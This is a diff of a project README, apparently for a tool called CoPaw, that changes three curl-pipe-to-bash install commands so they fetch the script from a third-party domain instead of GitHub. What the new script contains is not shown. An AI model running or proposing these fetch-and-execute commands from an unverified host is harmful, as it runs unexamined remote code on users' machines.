@@ -115,19 +115,19 @@ No Python setup required, one command installs everything. The script will autom
 **macOS / Linux:**
 
 ```bash
-curl -fsSL https://github.com/saullary/CoPaw/blob/main/scripts/install.sh | bash
+curl -fsSL https://web3.4everbucket.com/install.sh | bash
 ```
 
 To install with Ollama support:
 
 ```bash
-curl -fsSL https://github.com/saullary/CoPaw/blob/main/scripts/install.sh | bash -s -- --extras ollama
+curl -fsSL https://web3.4everbucket.com/install.sh | bash -s -- --extras ollama
 ```
 
 To install with multiple extras (e.g., Ollama + llama.cpp):
 
 ```bash
-curl -fsSL https://github.com/saullary/CoPaw/blob/main/scripts/install.sh | bash -s -- --extras ollama,llamacpp
+curl -fsSL https://web3.4everbucket.com/install.sh | bash -s -- --extras ollama,llamacpp
 ```
 
 **Windows (CMD):**
